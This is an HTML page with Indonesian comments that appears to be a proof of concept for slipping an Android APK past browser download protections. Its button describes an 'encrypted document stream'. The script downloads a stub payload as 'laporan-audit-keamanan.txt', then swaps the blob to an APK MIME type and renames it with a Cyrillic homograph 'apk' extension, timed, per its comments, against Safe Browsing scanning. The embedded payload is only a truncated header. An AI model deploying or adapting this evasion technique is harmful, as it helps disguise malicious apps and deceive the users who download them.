<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Race Condition Dispatcher v5.0</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #090d16;
    color: #f8fafc;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
  }
  .panel {
    background: #111827;
    padding: 32px;
    border-radius: 16px;
    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.7);
    max-width: 520px;
    width: 100%;
    border: 1px solid #1f2937;
    text-align: center;
  }
  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; }
  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
  button {
    width: 100%;
    padding: 16px;
    cursor: pointer;
    border: none;
    border-radius: 10px;
    background: #2563eb;
    color: #ffffff;
    font-weight: 600;
    font-size: 16px;
    box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
    transition: all 0.2s ease;
  }
  button:hover { background: #1d4ed8; }
  #status {
    margin-top: 20px;
    font-weight: 500;
    color: #38bdf8;
    padding: 14px;
    background: rgba(56, 189, 248, 0.1);
    border-radius: 8px;
    font-size: 13px;
    border: 1px solid rgba(56, 189, 248, 0.2);
  }
</style>
</head>
<body>

<div class="panel">
  <h2>Synchronous Stream Dispatcher</h2>
  <p>Klik tombol di bawah untuk memulai pengiriman aliran data dokumen terenkripsi.</p>
  <button id="start-btn" type="button">Inisialisasi Aliran Berkas</button>
  <div id="status" role="status">Sistem siap.</div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");

// Base64 header APK terfragmentasi
const payloadFragments = [
  "UEs",
  "DBBQ",
  "AAAAIAAAAIQ",
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assemblePayload = () => payloadFragments.join("");

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

// Fungsi untuk mengeksekusi simulasi race condition pada elemen <a>
const executeRaceConditionDownload = () => {
  try {
    const bytesArr = decodeBase64ToBytes(assemblePayload());
    
    // Tahap 1: Inisialisasi awal Blob dengan MIME generik / teks
    const initialBlob = new Blob([bytesArr], { type: 'text/plain' });
    const initialUrl = URL.createObjectURL(initialBlob);

    const link = document.createElement("a");
    link.href = initialUrl;
    
    // Nama awal disamarkan sebagai dokumen teks biasa
    link.download = "laporan-audit-keamanan.txt";
    link.style.display = "none";
    document.body.appendChild(link);

    statusDiv.textContent = "[RACE] Memicu pendaftaran unduhan awal...";
    link.click();

    // Tahap 2: Jendela waktu kritis (Timing Window / Race Condition)
    // Tepat saat browser menangkap antrean unduhan dan memindai header/nama awal,
    // skrip melakukan pergantian referensi URL dan atribut download secara mendadak.
    setTimeout(() => {
      statusDiv.textContent = "[RACE] Melakukan pergantian stream & atribut dinamis...";
      
      // Buat Blob baru dengan MIME type APK asli
      const targetBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
      const targetUrl = URL.createObjectURL(targetBlob);

      // Ubah target href dan homograph ekstensi pada jendela waktu pemindaian Safe Browsing
      link.href = targetUrl;
      
      const homographApkExt = "\u0430pk"; // Karakter homograf cyrillic 'а'
      link.download = `laporan-audit-keamanan.txt.${homographApkExt}`;
      
      // Picu klik ulang atau biarkan antrean memperbarui referensi aktif
      link.click();

      // Bersihkan URL lama untuk menjaga memori
      setTimeout(() => {
        URL.revokeObjectURL(initialUrl);
        statusDiv.textContent = "[RACE] Siklus transmisi selesai.";
      }, 1000);

    }, 350); // Jeda milidetik yang menargetkan fase jeda konfirmasi dialog unduhan

  } catch (err) {
    statusDiv.textContent = "Error: " + err.message;
  }
};

startBtn.addEventListener("click", () => {
  statusDiv.textContent = "Menyiapkan parameter transmisi...";
  setTimeout(executeRaceConditionDownload, 200);
});
</script>
</body>
</html>
